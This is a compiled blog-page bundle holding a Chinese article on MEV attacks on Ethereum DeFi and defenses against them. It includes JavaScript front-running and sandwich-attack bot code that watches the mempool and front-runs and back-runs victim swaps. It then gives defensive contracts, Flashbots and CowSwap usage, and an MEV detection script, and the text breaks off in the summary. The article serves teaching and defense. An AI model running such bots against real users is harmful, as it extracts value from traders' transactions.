"use strict";(globalThis.webpackChunkblog_v1=globalThis.webpackChunkblog_v1||[]).push([[1141],{2648(n,e,t){t.r(e),t.d(e,{assets:()=>l,contentTitle:()=>o,default:()=>u,frontMatter:()=>r,metadata:()=>i,toc:()=>c});var i=t(2541),a=t(4848),s=t(8453);const r={slug:"mev-attacks-prevention",title:"MEV\u653b\u51fb\u5168\u666f\u56fe\uff1a\u4ece\u4e09\u660e\u6cbb\u653b\u51fb\u5230\u9632\u5fa1\u7b56\u7565",authors:["autosec"],tags:["MEV","\u62a2\u8dd1\u653b\u51fb","\u4e09\u660e\u6cbb\u653b\u51fb","DeFi\u5b89\u5168","\u533a\u5757\u94fe\u5b89\u5168"],date:"2026-02-04T10:00"},o="MEV\u653b\u51fb\u5168\u666f\u56fe\uff1a\u4ece\u4e09\u660e\u6cbb\u653b\u51fb\u5230\u9632\u5fa1\u7b56\u7565",l={authorsImageUrls:[void 0]},c=[{value:"\u4ec0\u4e48\u662fMEV\uff1f",id:"\u4ec0\u4e48\u662fmev",level:2},{value:"MEV\u7684\u7c7b\u578b",id:"mev\u7684\u7c7b\u578b",level:3},{value:"\u5e38\u89c1MEV\u653b\u51fb",id:"\u5e38\u89c1mev\u653b\u51fb",level:2},{value:"1. \u62a2\u8dd1\u653b\u51fb\uff08Front-Running\uff09",id:"1-\u62a2\u8dd1\u653b\u51fbfront-running",level:3},{value:"2. \u4e09\u660e\u6cbb\u653b\u51fb\uff08Sandwich Attack\uff09",id:"2-\u4e09\u660e\u6cbb\u653b\u51fbsandwich-attack",level:3},{value:"3. \u6e05\u7b97\u62a2\u8dd1",id:"3-\u6e05\u7b97\u62a2\u8dd1",level:3},{value:"\u9632\u5fa1\u7b56\u7565",id:"\u9632\u5fa1\u7b56\u7565",level:2},{value:"1. \u4f7f\u7528\u79c1\u6709\u4ea4\u6613\u6c60",id:"1-\u4f7f\u7528\u79c1\u6709\u4ea4\u6613\u6c60",level:3},{value:"2. \u63d0\u4ea4-\u63ed\u793a\u65b9\u6848\uff08Commit-Reveal\uff09",id:"2-\u63d0\u4ea4-\u63ed\u793a\u65b9\u6848commit-reveal",level:3},{value:"3. \u6ed1\u70b9\u4fdd\u62a4",id:"3-\u6ed1\u70b9\u4fdd\u62a4",level:3},{value:"4. \u65f6\u95f4\u9501\u548c\u5ef6\u8fdf\u6267\u884c",id:"4-\u65f6\u95f4\u9501\u548c\u5ef6\u8fdf\u6267\u884c",level:3},{value:"MEV\u4fdd\u62a4\u670d\u52a1",id:"mev\u4fdd\u62a4\u670d\u52a1",level:2},{value:"1. Flashbots Protect",id:"1-flashbots-protect",level:3},{value:"2. Eden Network",id:"2-eden-network",level:3},{value:"3. CowSwap (MEV Blocker)",id:"3-cowswap-mev-blocker",level:3},{value:"MEV\u76d1\u63a7\u548c\u5206\u6790",id:"mev\u76d1\u63a7\u548c\u5206\u6790",level:2},{value:"1. MEV\u68c0\u6d4b",id:"1-mev\u68c0\u6d4b",level:3},{value:"2. MEV\u4eea\u8868\u677f",id:"2-mev\u4eea\u8868\u677f",level:3},{value:"\u672a\u6765\u53d1\u5c55",id:"\u672a\u6765\u53d1\u5c55",level:2},{value:"1. MEV-Boost",id:"1-mev-boost",level:3},{value:"2. Proposer-Builder Separation (PBS)",id:"2-proposer-builder-separation-pbs",level:3},{value:"3. \u52a0\u5bc6\u5185\u5b58\u6c60",id:"3-\u52a0\u5bc6\u5185\u5b58\u6c60",level:3},{value:"\u603b\u7ed3",id:"\u603b\u7ed3",level:2}];function d(n){const e={code:"code",h2:"h2",h3:"h3",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,s.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(e.p,{children:"\u6700\u5927\u53ef\u63d0\u53d6\u4ef7\u503c\uff08MEV, Maximal Extractable Value\uff09\u5df2\u6210\u4e3aDeFi\u751f\u6001\u7cfb\u7edf\u4e2d\u6700\u4e25\u91cd\u7684\u5b89\u5168\u5a01\u80c1\u4e4b\u4e00\u30022023\u5e74\uff0cMEV\u63d0\u53d6\u603b\u989d\u8d85\u8fc76\u4ebf\u7f8e\u5143\uff0c\u5176\u4e2d\u5927\u90e8\u5206\u6765\u81ea\u5bf9\u666e\u901a\u7528\u6237\u7684\u653b\u51fb\u3002"}),"\n",(0,a.jsx)(e.h2,{id:"\u4ec0\u4e48\u662fmev",children:"\u4ec0\u4e48\u662fMEV\uff1f"}),"\n",(0,a.jsx)(e.p,{children:"MEV\u662f\u6307\u77ff\u5de5/\u9a8c\u8bc1\u8005\u901a\u8fc7\u91cd\u65b0\u6392\u5e8f\u3001\u63d2\u5165\u6216\u5ba1\u67e5\u533a\u5757\u5185\u7684\u4ea4\u6613\u800c\u53ef\u4ee5\u63d0\u53d6\u7684\u6700\u5927\u4ef7\u503c\u3002"}),"\n",(0,a.jsx)(e.h3,{id:"mev\u7684\u7c7b\u578b",children:"MEV\u7684\u7c7b\u578b"}),"\n",(0,a.jsxs)(e.ol,{children:["\n",(0,a.jsxs)(e.li,{children:[(0,a.jsx)(e.strong,{children:"\u826f\u6027MEV"}),": \u5957\u5229\u3001\u6e05\u7b97"]}),"\n",(0,a.jsxs)(e.li,{children:[(0,a.jsx)(e.strong,{children:"\u6076\u610fMEV"}),": \u62a2\u8dd1\u3001\u4e09\u660e\u6cbb\u653b\u51fb\u3001\u65f6\u95f4\u5f3a\u76d7\u653b\u51fb"]}),"\n"]}),"\n",(0,a.jsx)(e.h2,{id:"\u5e38\u89c1mev\u653b\u51fb",children:"\u5e38\u89c1MEV\u653b\u51fb"}),"\n",(0,a.jsx)(e.h3,{id:"1-\u62a2\u8dd1\u653b\u51fbfront-running",children:"1. \u62a2\u8dd1\u653b\u51fb\uff08Front-Running\uff09"}),"\n",(0,a.jsx)(e.p,{children:"\u653b\u51fb\u8005\u76d1\u63a7\u5185\u5b58\u6c60\uff0c\u53d1\u73b0\u6709\u5229\u53ef\u56fe\u7684\u4ea4\u6613\u540e\uff0c\u901a\u8fc7\u652f\u4ed8\u66f4\u9ad8\u7684gas\u8d39\u7528\u4f7f\u81ea\u5df1\u7684\u4ea4\u6613\u4f18\u5148\u6267\u884c\u3002"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-solidity",children:'// \u6613\u53d7\u62a2\u8dd1\u653b\u51fb\u7684\u5408\u7ea6\ncontract VulnerableAuction {\n    address public highestBidder;\n    uint256 public highestBid;\n    \n    function bid() external payable {\n        require(msg.value > highestBid, "Bid too low");\n        \n        // \u9000\u8fd8\u524d\u4e00\u4e2a\u51fa\u4ef7\u8005\n        if (highestBidder != address(0)) {\n            payable(highestBidder).transfer(highestBid);\n        }\n        \n        highestBidder = msg.sender;\n        highestBid = msg.value;\n    }\n}\n'})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.strong,{children:"\u653b\u51fb\u573a\u666f\uff1a"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-javascript",children:"// \u653b\u51fb\u8005\u76d1\u63a7\u5185\u5b58\u6c60\nconst provider = new ethers.providers.WebSocketProvider(WEBSOCKET_URL);\n\nprovider.on('pending', async (txHash) => {\n    const tx = await provider.getTransaction(txHash);\n    \n    if (tx && tx.to === AUCTION_ADDRESS) {\n        const decodedData = auctionInterface.parseTransaction({ data: tx.data });\n        \n        if (decodedData.name === 'bid') {\n            // \u53d1\u9001\u66f4\u9ad8gas\u4ef7\u683c\u7684\u4ea4\u6613\u62a2\u8dd1\n            const frontRunTx = await auction.bid({\n                value: tx.value.add(ethers.utils.parseEther('0.01')),\n                gasPrice: tx.gasPrice.mul(110).div(100) // \u63d0\u9ad810% gas\u4ef7\u683c\n            });\n            \n            console.log('Front-run transaction:', frontRunTx.hash);\n        }\n    }\n});\n"})}),"\n",(0,a.jsx)(e.h3,{id:"2-\u4e09\u660e\u6cbb\u653b\u51fbsandwich-attack",children:"2. \u4e09\u660e\u6cbb\u653b\u51fb\uff08Sandwich Attack\uff09"}),"\n",(0,a.jsx)(e.p,{children:"\u653b\u51fb\u8005\u5728\u76ee\u6807\u4ea4\u6613\u524d\u540e\u5404\u63d2\u5165\u4e00\u7b14\u4ea4\u6613\uff0c\u4ece\u4ef7\u683c\u6ed1\u70b9\u4e2d\u83b7\u5229\u3002"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-javascript",children:"// \u4e09\u660e\u6cbb\u653b\u51fb\u793a\u4f8b\nclass SandwichAttacker {\n    constructor(provider, router, token) {\n        this.provider = provider;\n        this.router = router;\n        this.token = token;\n    }\n    \n    async detectVictim() {\n        this.provider.on('pending', async (txHash) => {\n            const tx = await this.provider.getTransaction(txHash);\n            \n            if (this.isSwapTransaction(tx)) {\n                await this.executeSandwich(tx);\n            }\n        });\n    }\n    \n    async executeSandwich(victimTx) {\n        const victimAmount = this.extractAmount(victimTx);\n        \n        // \u6b65\u9aa41: Front-run - \u4e70\u5165\u63a8\u9ad8\u4ef7\u683c\n        const frontRunTx = await this.router.swapExactETHForTokens(\n            0, // \u63a5\u53d7\u4efb\u4f55\u6570\u91cf\n            [WETH, this.token],\n            this.wallet.address,\n            Date.now() + 1000,\n            {\n                value: victimAmount.mul(2),\n                gasPrice: victimTx.gasPrice.add(ethers.utils.parseUnits('10', 'gwei'))\n            }\n        );\n        \n        console.log('Front-run tx:', frontRunTx.hash);\n        \n        // \u6b65\u9aa42: \u7b49\u5f85\u53d7\u5bb3\u8005\u4ea4\u6613\u6267\u884c\n        await victimTx.wait();\n        \n        // \u6b65\u9aa43: Back-run - \u5356\u51fa\u83b7\u5229\n        const balance = await this.token.balanceOf(this.wallet.address);\n        const backRunTx = await this.router.swapExactTokensForETH(\n            balance,\n            0,\n            [this.token, WETH],\n            this.wallet.address,\n            Date.now() + 1000,\n            {\n                gasPrice: victimTx.gasPrice.add(ethers.utils.parseUnits('5', 'gwei'))\n            }\n        );\n        \n        console.log('Back-run tx:', backRunTx.hash);\n    }\n    \n    isSwapTransaction(tx) {\n        if (!tx || !tx.data) return false;\n        \n        const methodId = tx.data.slice(0, 10);\n        const swapMethods = [\n            '0x7ff36ab5', // swapExactETHForTokens\n            '0x18cbafe5', // swapExactTokensForETH\n            '0x38ed1739', // swapExactTokensForTokens\n        ];\n        \n        return swapMethods.includes(methodId);\n    }\n}\n"})}),"\n",(0,a.jsx)(e.h3,{id:"3-\u6e05\u7b97\u62a2\u8dd1",children:"3. \u6e05\u7b97\u62a2\u8dd1"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-solidity",children:'// \u501f\u8d37\u534f\u8bae\u6e05\u7b97\ncontract LendingProtocol {\n    struct Position {\n        uint256 collateral;\n        uint256 debt;\n        address owner;\n    }\n    \n    mapping(address => Position) public positions;\n    uint256 public constant LIQUIDATION_THRESHOLD = 150; // 150%\n    \n    function liquidate(address user) external {\n        Position storage position = positions[user];\n        \n        uint256 collateralValue = getCollateralValue(position.collateral);\n        uint256 debtValue = getDebtValue(position.debt);\n        \n        // \u68c0\u67e5\u662f\u5426\u53ef\u6e05\u7b97\n        require(\n            collateralValue * 100 < debtValue * LIQUIDATION_THRESHOLD,\n            "Position is healthy"\n        );\n        \n        // \u6e05\u7b97\u5956\u52b1\uff1a5%\n        uint256 liquidationReward = position.collateral * 5 / 100;\n        \n        // \u8f6c\u79fb\u62b5\u62bc\u54c1\n        token.transfer(msg.sender, position.collateral + liquidationReward);\n        \n        // \u6e05\u9664\u503a\u52a1\n        delete positions[user];\n    }\n}\n'})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.strong,{children:"MEV\u673a\u5668\u4eba\u7ade\u4e89\uff1a"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-javascript",children:"// \u6e05\u7b97\u673a\u5668\u4eba\nclass LiquidationBot {\n    async monitorPositions() {\n        const positions = await this.protocol.getAllPositions();\n        \n        for (const position of positions) {\n            const health = await this.calculateHealth(position);\n            \n            if (health < 1.5) {\n                await this.attemptLiquidation(position);\n            }\n        }\n    }\n    \n    async attemptLiquidation(position) {\n        // \u4f7f\u7528 Flashbots \u907f\u514d\u88ab\u62a2\u8dd1\n        const bundle = [\n            {\n                transaction: await this.protocol.populateTransaction.liquidate(position.user),\n                signer: this.wallet\n            }\n        ];\n        \n        const signedBundle = await flashbotsProvider.signBundle(bundle);\n        const simulation = await flashbotsProvider.simulate(signedBundle, targetBlock);\n        \n        if (simulation.firstRevert) {\n            console.log('Simulation failed:', simulation.firstRevert);\n            return;\n        }\n        \n        // \u53d1\u9001bundle\n        const bundleSubmission = await flashbotsProvider.sendRawBundle(\n            signedBundle,\n            targetBlock\n        );\n        \n        console.log('Bundle submitted:', bundleSubmission.bundleHash);\n    }\n}\n"})}),"\n",(0,a.jsx)(e.h2,{id:"\u9632\u5fa1\u7b56\u7565",children:"\u9632\u5fa1\u7b56\u7565"}),"\n",(0,a.jsx)(e.h3,{id:"1-\u4f7f\u7528\u79c1\u6709\u4ea4\u6613\u6c60",children:"1. \u4f7f\u7528\u79c1\u6709\u4ea4\u6613\u6c60"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-javascript",children:"// Flashbots \u79c1\u6709\u4ea4\u6613\u793a\u4f8b\nconst { FlashbotsBundleProvider } = require('@flashbots/ethers-provider-bundle');\n\nasync function sendPrivateTransaction(tx) {\n    const flashbotsProvider = await FlashbotsBundleProvider.create(\n        provider,\n        authSigner,\n        'https://relay.flashbots.net'\n    );\n    \n    const targetBlock = await provider.getBlockNumber() + 1;\n    \n    const bundle = [\n        {\n            signer: wallet,\n            transaction: tx\n        }\n    ];\n    \n    const signedBundle = await flashbotsProvider.signBundle(bundle);\n    \n    // \u6a21\u62dfbundle\n    const simulation = await flashbotsProvider.simulate(signedBundle, targetBlock);\n    console.log('Simulation:', simulation);\n    \n    // \u53d1\u9001bundle\n    const bundleSubmission = await flashbotsProvider.sendRawBundle(\n        signedBundle,\n        targetBlock\n    );\n    \n    const waitResponse = await bundleSubmission.wait();\n    \n    if (waitResponse === FlashbotsBundleResolution.BundleIncluded) {\n        console.log('Bundle included in block');\n    } else if (waitResponse === FlashbotsBundleResolution.BlockPassedWithoutInclusion) {\n        console.log('Bundle not included');\n    }\n}\n"})}),"\n",(0,a.jsx)(e.h3,{id:"2-\u63d0\u4ea4-\u63ed\u793a\u65b9\u6848commit-reveal",children:"2. \u63d0\u4ea4-\u63ed\u793a\u65b9\u6848\uff08Commit-Reveal\uff09"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-solidity",children:'// \u9632\u62a2\u8dd1\u7684\u62cd\u5356\u5408\u7ea6\ncontract SecureAuction {\n    struct Bid {\n        bytes32 commitment;\n        uint256 deposit;\n        bool revealed;\n    }\n    \n    mapping(address => Bid) public bids;\n    uint256 public revealDeadline;\n    uint256 public auctionEnd;\n    \n    address public highestBidder;\n    uint256 public highestBid;\n    \n    // \u9636\u6bb51: \u63d0\u4ea4\u627f\u8bfa\n    function commitBid(bytes32 commitment) external payable {\n        require(block.timestamp < revealDeadline, "Commit period ended");\n        require(bids[msg.sender].commitment == bytes32(0), "Already committed");\n        \n        bids[msg.sender] = Bid({\n            commitment: commitment,\n            deposit: msg.value,\n            revealed: false\n        });\n    }\n    \n    // \u9636\u6bb52: \u63ed\u793a\u51fa\u4ef7\n    function revealBid(uint256 value, bytes32 secret) external {\n        require(block.timestamp >= revealDeadline, "Reveal period not started");\n        require(block.timestamp < auctionEnd, "Auction ended");\n        \n        Bid storage bid = bids[msg.sender];\n        require(!bid.revealed, "Already revealed");\n        \n        // \u9a8c\u8bc1\u627f\u8bfa\n        bytes32 commitment = keccak256(abi.encodePacked(value, secret));\n        require(commitment == bid.commitment, "Invalid reveal");\n        \n        bid.revealed = true;\n        \n        // \u68c0\u67e5\u662f\u5426\u662f\u6700\u9ad8\u51fa\u4ef7\n        if (value > highestBid && bid.deposit >= value) {\n            if (highestBidder != address(0)) {\n                // \u9000\u8fd8\u524d\u4e00\u4e2a\u6700\u9ad8\u51fa\u4ef7\u8005\n                payable(highestBidder).transfer(highestBid);\n            }\n            \n            highestBidder = msg.sender;\n            highestBid = value;\n        }\n        \n        // \u9000\u8fd8\u591a\u4f59\u7684\u62bc\u91d1\n        if (bid.deposit > value) {\n            payable(msg.sender).transfer(bid.deposit - value);\n        }\n    }\n}\n'})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.strong,{children:"\u4f7f\u7528\u793a\u4f8b\uff1a"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-javascript",children:"// \u7528\u6237\u63d0\u4ea4\u51fa\u4ef7\nasync function placeBid(amount) {\n    const secret = ethers.utils.randomBytes(32);\n    const commitment = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n            ['uint256', 'bytes32'],\n            [amount, secret]\n        )\n    );\n    \n    // \u9636\u6bb51: \u63d0\u4ea4\u627f\u8bfa\n    const commitTx = await auction.commitBid(commitment, {\n        value: amount\n    });\n    await commitTx.wait();\n    \n    // \u4fdd\u5b58secret\u7528\u4e8e\u540e\u7eed\u63ed\u793a\n    localStorage.setItem('bidSecret', ethers.utils.hexlify(secret));\n    localStorage.setItem('bidAmount', amount.toString());\n}\n\nasync function revealBid() {\n    const secret = localStorage.getItem('bidSecret');\n    const amount = localStorage.getItem('bidAmount');\n    \n    // \u9636\u6bb52: \u63ed\u793a\u51fa\u4ef7\n    const revealTx = await auction.revealBid(amount, secret);\n    await revealTx.wait();\n}\n"})}),"\n",(0,a.jsx)(e.h3,{id:"3-\u6ed1\u70b9\u4fdd\u62a4",children:"3. \u6ed1\u70b9\u4fdd\u62a4"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-solidity",children:'// DEX\u4ea4\u6613\u6ed1\u70b9\u4fdd\u62a4\ncontract SecureDEX {\n    function swapWithSlippageProtection(\n        address tokenIn,\n        address tokenOut,\n        uint256 amountIn,\n        uint256 minAmountOut,\n        uint256 maxPriceImpact // \u4ee5\u57fa\u70b9\u8868\u793a\uff0c\u4f8b\u598250 = 0.5%\n    ) external returns (uint256 amountOut) {\n        // \u83b7\u53d6\u5f53\u524d\u4ef7\u683c\n        uint256 currentPrice = getPrice(tokenIn, tokenOut);\n        \n        // \u8ba1\u7b97\u9884\u671f\u8f93\u51fa\n        uint256 expectedOut = calculateExpectedOutput(amountIn, currentPrice);\n        \n        // \u6267\u884c\u4ea4\u6362\n        amountOut = _swap(tokenIn, tokenOut, amountIn);\n        \n        // \u68c0\u67e5\u6ed1\u70b9\n        require(amountOut >= minAmountOut, "Slippage too high");\n        \n        // \u68c0\u67e5\u4ef7\u683c\u5f71\u54cd\n        uint256 priceImpact = calculatePriceImpact(amountIn, amountOut, currentPrice);\n        require(priceImpact <= maxPriceImpact, "Price impact too high");\n        \n        return amountOut;\n    }\n    \n    function calculatePriceImpact(\n        uint256 amountIn,\n        uint256 amountOut,\n        uint256 initialPrice\n    ) internal pure returns (uint256) {\n        uint256 executionPrice = (amountIn * 1e18) / amountOut;\n        uint256 impact = ((executionPrice - initialPrice) * 10000) / initialPrice;\n        return impact;\n    }\n}\n'})}),"\n",(0,a.jsx)(e.h3,{id:"4-\u65f6\u95f4\u9501\u548c\u5ef6\u8fdf\u6267\u884c",children:"4. \u65f6\u95f4\u9501\u548c\u5ef6\u8fdf\u6267\u884c"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-solidity",children:'// \u5e26\u65f6\u95f4\u9501\u7684\u4ea4\u6613\ncontract TimelockProtection {\n    struct PendingTransaction {\n        address target;\n        uint256 value;\n        bytes data;\n        uint256 executeAfter;\n        bool executed;\n    }\n    \n    mapping(bytes32 => PendingTransaction) public pendingTxs;\n    uint256 public constant MIN_DELAY = 1 hours;\n    uint256 public constant MAX_DELAY = 7 days;\n    \n    event TransactionQueued(bytes32 indexed txHash, uint256 executeAfter);\n    event TransactionExecuted(bytes32 indexed txHash);\n    \n    function queueTransaction(\n        address target,\n        uint256 value,\n        bytes memory data,\n        uint256 delay\n    ) external returns (bytes32) {\n        require(delay >= MIN_DELAY && delay <= MAX_DELAY, "Invalid delay");\n        \n        bytes32 txHash = keccak256(abi.encode(target, value, data, block.timestamp));\n        uint256 executeAfter = block.timestamp + delay;\n        \n        pendingTxs[txHash] = PendingTransaction({\n            target: target,\n            value: value,\n            data: data,\n            executeAfter: executeAfter,\n            executed: false\n        });\n        \n        emit TransactionQueued(txHash, executeAfter);\n        return txHash;\n    }\n    \n    function executeTransaction(bytes32 txHash) external {\n        PendingTransaction storage pendingTx = pendingTxs[txHash];\n        \n        require(!pendingTx.executed, "Already executed");\n        require(block.timestamp >= pendingTx.executeAfter, "Too early");\n        \n        pendingTx.executed = true;\n        \n        (bool success, ) = pendingTx.target.call{value: pendingTx.value}(pendingTx.data);\n        require(success, "Execution failed");\n        \n        emit TransactionExecuted(txHash);\n    }\n}\n'})}),"\n",(0,a.jsx)(e.h2,{id:"mev\u4fdd\u62a4\u670d\u52a1",children:"MEV\u4fdd\u62a4\u670d\u52a1"}),"\n",(0,a.jsx)(e.h3,{id:"1-flashbots-protect",children:"1. Flashbots Protect"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-javascript",children:"// \u4f7f\u7528 Flashbots Protect RPC\nconst provider = new ethers.providers.JsonRpcProvider(\n    'https://rpc.flashbots.net'\n);\n\n// \u53d1\u9001\u4ea4\u6613\u5230Flashbots\nasync function sendProtectedTransaction(tx) {\n    const signedTx = await wallet.signTransaction(tx);\n    const txResponse = await provider.sendTransaction(signedTx);\n    \n    console.log('Protected transaction:', txResponse.hash);\n    return txResponse;\n}\n"})}),"\n",(0,a.jsx)(e.h3,{id:"2-eden-network",children:"2. Eden Network"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-javascript",children:"// Eden Network \u914d\u7f6e\nconst edenProvider = new ethers.providers.JsonRpcProvider(\n    'https://api.edennetwork.io/v1/rpc'\n);\n\n// \u8d28\u62bcEDEN\u4ee3\u5e01\u83b7\u5f97\u4f18\u5148\u6743\nasync function stakeForPriority(amount) {\n    const edenToken = new ethers.Contract(EDEN_TOKEN, ERC20_ABI, wallet);\n    const stakingContract = new ethers.Contract(EDEN_STAKING, STAKING_ABI, wallet);\n    \n    // \u6279\u51c6\n    await edenToken.approve(EDEN_STAKING, amount);\n    \n    // \u8d28\u62bc\n    await stakingContract.stake(amount);\n}\n"})}),"\n",(0,a.jsx)(e.h3,{id:"3-cowswap-mev-blocker",children:"3. CowSwap (MEV Blocker)"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-javascript",children:"// CowSwap \u8ba2\u5355\nconst { OrderBookApi, OrderKind, SigningScheme } = require('@cowprotocol/cow-sdk');\n\nasync function createCowSwapOrder(sellToken, buyToken, amount) {\n    const orderBookApi = new OrderBookApi({ chainId: 1 });\n    \n    const order = {\n        sellToken: sellToken,\n        buyToken: buyToken,\n        sellAmount: amount.toString(),\n        buyAmount: '0', // \u8ba9\u6c42\u89e3\u5668\u8ba1\u7b97\n        validTo: Math.floor(Date.now() / 1000) + 3600, // 1\u5c0f\u65f6\u6709\u6548\u671f\n        appData: '0x0000000000000000000000000000000000000000000000000000000000000000',\n        feeAmount: '0',\n        kind: OrderKind.SELL,\n        partiallyFillable: false,\n        sellTokenBalance: 'erc20',\n        buyTokenBalance: 'erc20'\n    };\n    \n    const signature = await signOrder(order, wallet);\n    \n    const orderId = await orderBookApi.sendOrder({\n        ...order,\n        signature,\n        signingScheme: SigningScheme.EIP712\n    });\n    \n    console.log('Order ID:', orderId);\n    return orderId;\n}\n"})}),"\n",(0,a.jsx)(e.h2,{id:"mev\u76d1\u63a7\u548c\u5206\u6790",children:"MEV\u76d1\u63a7\u548c\u5206\u6790"}),"\n",(0,a.jsx)(e.h3,{id:"1-mev\u68c0\u6d4b",children:"1. MEV\u68c0\u6d4b"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-python",children:"# MEV\u4ea4\u6613\u68c0\u6d4b\u811a\u672c\nimport requests\nfrom web3 import Web3\n\nclass MEVDetector:\n    def __init__(self, web3_provider):\n        self.w3 = Web3(Web3.HTTPProvider(web3_provider))\n    \n    def analyze_block(self, block_number):\n        block = self.w3.eth.get_block(block_number, full_transactions=True)\n        mev_transactions = []\n        \n        for i, tx in enumerate(block.transactions):\n            # \u68c0\u67e5\u4e09\u660e\u6cbb\u653b\u51fb\n            if i > 0 and i < len(block.transactions) - 1:\n                prev_tx = block.transactions[i-1]\n                next_tx = block.transactions[i+1]\n                \n                if self.is_sandwich(prev_tx, tx, next_tx):\n                    mev_transactions.append({\n                        'type': 'sandwich',\n                        'victim': tx['hash'].hex(),\n                        'frontrun': prev_tx['hash'].hex(),\n                        'backrun': next_tx['hash'].hex(),\n                        'profit': self.calculate_profit(prev_tx, next_tx)\n                    })\n            \n            # \u68c0\u67e5\u62a2\u8dd1\n            if self.is_frontrun(tx, block.transactions[:i]):\n                mev_transactions.append({\n                    'type': 'frontrun',\n                    'transaction': tx['hash'].hex()\n                })\n        \n        return mev_transactions\n    \n    def is_sandwich(self, tx1, tx2, tx3):\n        # \u68c0\u67e5\u662f\u5426\u662f\u540c\u4e00\u4e2aDEX\n        if tx1['to'] != tx3['to']:\n            return False\n        \n        # \u68c0\u67e5\u662f\u5426\u662f\u76f8\u540c\u7684\u4ea4\u6613\u5bf9\n        # \u7b80\u5316\u7248\u672c\uff0c\u5b9e\u9645\u9700\u8981\u89e3\u6790\u4ea4\u6613\u6570\u636e\n        return (\n            tx1['from'] == tx3['from'] and\n            tx1['gasPrice'] > tx2['gasPrice'] and\n            tx3['gasPrice'] > tx2['gasPrice']\n        )\n    \n    def calculate_profit(self, frontrun_tx, backrun_tx):\n        # \u8ba1\u7b97MEV\u5229\u6da6\n        # \u9700\u8981\u89e3\u6790\u4ea4\u6613receipt\u548c\u4e8b\u4ef6\n        pass\n"})}),"\n",(0,a.jsx)(e.h3,{id:"2-mev\u4eea\u8868\u677f",children:"2. MEV\u4eea\u8868\u677f"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-javascript",children:"// MEV\u7edf\u8ba1API\nconst express = require('express');\nconst app = express();\n\napp.get('/api/mev/stats', async (req, res) => {\n    const stats = await getMEVStats();\n    res.json(stats);\n});\n\nasync function getMEVStats() {\n    const latestBlock = await provider.getBlockNumber();\n    const blocks = await Promise.all(\n        Array.from({ length: 100 }, (_, i) => \n            provider.getBlockWithTransactions(latestBlock - i)\n        )\n    );\n    \n    let totalMEV = ethers.BigNumber.from(0);\n    let sandwichCount = 0;\n    let frontrunCount = 0;\n    \n    for (const block of blocks) {\n        const analysis = await analyzeBlockForMEV(block);\n        totalMEV = totalMEV.add(analysis.totalValue);\n        sandwichCount += analysis.sandwichAttacks;\n        frontrunCount += analysis.frontrunAttacks;\n    }\n    \n    return {\n        totalMEVExtracted: ethers.utils.formatEther(totalMEV),\n        sandwichAttacks: sandwichCount,\n        frontrunAttacks: frontrunCount,\n        averageMEVPerBlock: ethers.utils.formatEther(totalMEV.div(blocks.length))\n    };\n}\n"})}),"\n",(0,a.jsx)(e.h2,{id:"\u672a\u6765\u53d1\u5c55",children:"\u672a\u6765\u53d1\u5c55"}),"\n",(0,a.jsx)(e.h3,{id:"1-mev-boost",children:"1. MEV-Boost"}),"\n",(0,a.jsx)(e.p,{children:"\u4ee5\u592a\u574a\u5408\u5e76\u540e\u7684MEV\u89e3\u51b3\u65b9\u6848\uff0c\u5206\u79bb\u533a\u5757\u6784\u5efa\u548c\u63d0\u8bae\u3002"}),"\n",(0,a.jsx)(e.h3,{id:"2-proposer-builder-separation-pbs",children:"2. Proposer-Builder Separation (PBS)"}),"\n",(0,a.jsx)(e.p,{children:"\u5c06\u533a\u5757\u63d0\u8bae\u8005\u548c\u6784\u5efa\u8005\u89d2\u8272\u5206\u79bb\uff0c\u51cf\u5c11MEV\u5bf9\u5171\u8bc6\u7684\u5f71\u54cd\u3002"}),"\n",(0,a.jsx)(e.h3,{id:"3-\u52a0\u5bc6\u5185\u5b58\u6c60",children:"3. \u52a0\u5bc6\u5185\u5b58\u6c60"}),"\n",(0,a.jsx)(e.p,{children:"\u4f7f\u7528\u9608\u503c\u52a0\u5bc6\u6280\u672f\u4fdd\u62a4\u4ea4\u6613\u9690\u79c1\uff0c\u76f4\u5230\u88ab\u6253\u5305\u8fdb\u533a\u5757\u3002"}),"\n",(0,a.jsx)(e.h2,{id:"\u603b\u7ed3",children:"\u603b\u7ed3"}),"\n",(0,a.jsx)(e.p,{children:"MEV\u662fDeFi\u751f\u6001\u7cfb\u7edf\u4e2d\u4e0d\u53ef\u907f\u514d\u7684\u73b0\u8c61\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\uff1a"}),"\n",(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsxs)(e.li,{children:["\ud83d\udee1\ufe0f ",(0,a.jsx)(e.strong,{children:"\u4f7f\u7528\u9632\u62a4\u5de5\u5177"}),": Flashbots, Eden, CowSwap"]}),"\n",(0,a.jsxs)(e.li,{children:["\ud83d\udd12 ",(0,a.jsx)(e.strong,{children:"\u5b9e\u65bd\u5b89\u5168\u6a21\u5f0f"}),": Commit-Reveal, \u65f6\u95f4\u9501"]}),"\n",(0,a.jsxs)(e.li,{children:["\ud83d\udcca 